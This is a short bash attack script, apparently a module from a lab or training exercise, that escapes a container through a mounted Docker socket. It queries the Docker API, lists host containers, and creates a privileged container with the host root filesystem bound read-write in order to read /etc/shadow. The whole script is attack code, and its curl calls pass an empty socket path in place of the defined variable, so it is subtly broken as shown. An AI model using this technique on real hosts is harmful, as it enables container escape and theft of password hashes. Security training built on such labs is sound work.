#!/usr/bin/env bash
# MODULE 5: Container Escape via Docker Socket
# Target: vuln-web (has /var/run/docker.sock mounted)
# Technique: Use Docker API over socket to spawn privileged container

SOCK="/var/run/docker.sock"

echo "[*] Verifying Docker socket access..."
curl -s --unix-socket "" http://localhost/version

echo "[*] Listing all containers on host..."
curl -s --unix-socket "" "http://localhost/containers/json?all=true"

echo "[*] Spawning privileged container with host filesystem..."
curl -s --unix-socket "" -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host:rw"],"Privileged":true}}' \
  http://localhost/containers/create
